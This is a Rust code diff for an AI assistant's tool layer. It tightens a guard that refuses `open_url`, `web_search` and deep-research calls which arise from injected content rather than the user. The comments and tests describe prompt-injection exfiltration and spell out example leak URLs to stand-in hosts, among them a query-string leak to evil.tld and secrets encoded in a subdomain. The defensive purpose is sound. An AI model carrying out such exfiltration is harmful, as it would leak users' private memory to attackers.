@@ -6386,20 +6386,23 @@ async fn execute_mcp_tool(
 /// intent already honor; routing recall through the unscoped `all_user_facts`
 /// would have leaked every agent's private notes across that boundary.
 /// The egress refusal for a non-user-originated outward GET, or `None` if the
-/// call is safe to run. For `open_url`, a data-bearing URL (query string or a
-/// path beyond the bare root) is refused; a bare navigational open is allowed.
-/// For `web_search`, a non-empty query is itself data-bearing and is refused.
+/// call is safe to run. On a CONTINUATION the argument may come from injected
+/// content, so `open_url` is refused for ANY non-empty URL — not merely a
+/// data-bearing query/path — because a bare host still exfiltrates via an encoded
+/// SUBDOMAIN (`https://<secret>.attacker.tld`), i.e. the hostname itself is
+/// attacker-controllable data. `web_search` and `sage_research` are refused for a
+/// non-empty query/question (the search terms themselves are the outbound data).
 /// Returns the spoken is_error tool_result the model relays to the user.
 fn outward_get_egress_refusal(name: &str, input: &Value) -> Option<String> {
     match name {
         "open_url" => {
             let url = input.get("url").and_then(Value::as_str).unwrap_or_default();
-            if url.is_empty() || !crate::actions::url_is_data_bearing(url) {
-                return None; // bare/empty URL is navigational, not an exfil channel
+            if url.trim().is_empty() {
+                return None; // nothing to open
             }
             Some(format!(
-                "I won't open a URL that carries data in its query or path from inside a \
-                 page or message I just read — that's how a hidden instruction would \
+                "I won't open a URL that came from a page or message I just read — a \
+                 hidden instruction could use it (even the hostname, via a subdomain) to \
                  exfiltrate your information. If you want to open {url}, ask me directly."
             ))
         }
@@ -6412,6 +6415,21 @@ fn outward_get_egress_refusal(name: &str, input: &Value) -> Option<String> {
                 "I won't run a web search whose terms came from a page or message I just \
                  read — that could carry your information out. Ask me to search directly \
                  and I will."
+                    .to_string(),
+            )
+        }
+        "sage_research" => {
+            // SAGE deep-research fans `question` out into web searches + fetches, so an
+            // injected question is the same outbound data-bearing exfil channel as
+            // web_search (parity gap the audit flagged). Refuse it on a continuation.
+            let q = input.get("question").and_then(Value::as_str).unwrap_or_default();
+            if q.trim().is_empty() {
+                return None;
+            }
+            Some(
+                "I won't run deep research whose question came from a page or message I \
+                 just read — that could carry your information out to the web. Ask me to \
+                 research it directly and I will."
                     .to_string(),
             )
         }
@@ -6432,25 +6450,28 @@ async fn execute_tool(
     // continuation, so this flag scopes the prompt-injection egress guard below.
     user_originated: bool,
 ) -> (String, bool) {
-    // EGRESS GUARD (prompt-injection exfiltration). `open_url` / `web_search` are
-    // read-classified outward GETs: they are NOT in CONSEQUENTIAL_TOOLS, so they
-    // never park and never hit the voice-id chokepoint. That is fine for a URL the
-    // USER asked to open, but in a CONTINUATION the model may be acting on
-    // injected instructions inside fetched/MCP/email content, and a data-bearing
-    // GET to an attacker host is exactly how recalled memory would be exfiltrated
-    // (open_url('https://evil.tld/?d=<recalled facts>')). So: on a NON
-    // user-originated call, refuse `open_url` to a data-bearing URL (query string
-    // or non-root path) before any actuator runs, as an is_error tool_result the
-    // model relays. A bare navigational open (homepage, no query) stays allowed.
-    // `web_search` always targets a fixed search host (google.com), so the query
-    // reaches Google, not an attacker — but on a continuation we still refuse it,
-    // because the attacker-chosen query text is itself an outbound data-bearing
-    // GET and there is no legitimate need for injected content to drive a search.
+    // EGRESS GUARD (prompt-injection exfiltration). `open_url` / `web_search` /
+    // `sage_research` are read-classified outward GETs: they are NOT in
+    // CONSEQUENTIAL_TOOLS, so they never park and never hit the voice-id
+    // chokepoint. That is fine for a request the USER made, but in a CONTINUATION
+    // the model may be acting on injected instructions inside fetched/MCP/email
+    // content, and an outbound GET to an attacker host is exactly how recalled
+    // memory would be exfiltrated (open_url('https://evil.tld/?d=<recalled
+    // facts>')). So on a NON user-originated call we refuse these before any
+    // actuator runs, as an is_error tool_result the model relays:
+    //   - `open_url`: refused for ANY non-empty URL, not merely a data-bearing
+    //     query/path — a bare host still leaks via an encoded SUBDOMAIN
+    //     (https://<secret>.attacker.tld), so the hostname itself is data.
+    //   - `web_search`: the attacker-chosen query text is itself outbound data.
+    //   - `sage_research`: the deep-research question fans out into web
+    //     searches + fetches — the same exfil channel as web_search.
     // A user-originated call (call 0) is unaffected: "open evil.tld/?x" typed by
     // the owner still works exactly as before.
-    if !user_originated && (name == "open_url" || name == "web_search") {
+    if !user_originated
+        && (name == "open_url" || name == "web_search" || name == "sage_research")
+    {
         if let Some(refusal) = outward_get_egress_refusal(name, input) {
-            warn!(tool = name, "egress guard: refusing a data-bearing outward GET in a tool continuation");
+            warn!(tool = name, "egress guard: refusing an outward GET in a tool continuation");
             crate::telemetry::emit(
                 "system",
                 "egress.refused",
@@ -13507,24 +13528,31 @@ mod tests {
     /// outward GETs that never park, so injected instructions inside fetched/MCP/
     /// email content (which only enter context on a tool_loop CONTINUATION) could
     /// drive `open_url('https://evil.tld/?d=<recalled facts>')` and exfiltrate
-    /// memory with no gate. The egress guard refuses a DATA-BEARING outward GET on
-    /// a non-user-originated call BEFORE any actuator runs — so this test never
-    /// fires `/usr/bin/open` (the refusal short-circuits ahead of dispatch). A bare
-    /// navigational open and a USER-originated call are unaffected. We assert the
-    /// pure refusal logic (so the user-originated "allowed" case needs no
-    /// actuation) plus the execute_tool short-circuit on a continuation.
+    /// memory with no gate. The egress guard refuses an outward GET on a
+    /// non-user-originated call BEFORE any actuator runs — so this test never
+    /// fires `/usr/bin/open` (the refusal short-circuits ahead of dispatch). A
+    /// USER-originated call is unaffected. We assert the pure refusal logic plus
+    /// the execute_tool short-circuit on a continuation.
     #[tokio::test]
     async fn outward_get_egress_guard_blocks_data_bearing_url_in_continuation() {
         // -- pure refusal logic ------------------------------------------------
-        // Data-bearing open_url is refused; a bare host is allowed (None).
+        // Data-bearing open_url is refused.
         assert!(outward_get_egress_refusal(
             "open_url",
             &json!({"url": "https://evil.tld/?d=user.home_address"})
         )
         .is_some());
+        // A BARE host is ALSO refused: `https://<secret>.attacker.tld` exfiltrates
+        // via an encoded subdomain, so the hostname itself is attacker data. Only an
+        // empty URL is a no-op.
         assert!(
-            outward_get_egress_refusal("open_url", &json!({"url": "https://apple.com"})).is_none(),
-            "a bare navigational open must stay allowed"
+            outward_get_egress_refusal("open_url", &json!({"url": "https://secret.attacker.tld"}))
+                .is_some(),
+            "a bare host still leaks via subdomain — must be refused on a continuation"
+        );
+        assert!(
+            outward_get_egress_refusal("open_url", &json!({"url": "  "})).is_none(),
+            "an empty URL is a no-op"
         );
         // A non-empty web_search query is refused on a continuation; empty -> None.
         assert!(
@@ -13532,7 +13560,16 @@ mod tests {
                 .is_some()
         );
         assert!(outward_get_egress_refusal("web_search", &json!({"query": "  "})).is_none());
-        // The guard is scoped to the two outward-GET tools only.
+        // sage_research parity: a non-empty question is refused; empty -> None.
+        assert!(
+            outward_get_egress_refusal("sage_research", &json!({"question": "user secret data"}))
+                .is_some(),
+            "an injected deep-research question is the same exfil channel as web_search"
+        );
+        assert!(
+            outward_get_egress_refusal("sage_research", &json!({"question": ""})).is_none()
+        );
+        // The guard is scoped to the outward-GET tools only.
         assert!(outward_get_egress_refusal("recall_facts", &json!({})).is_none());
 
         // -- execute_tool short-circuits on a CONTINUATION (user_originated=false)
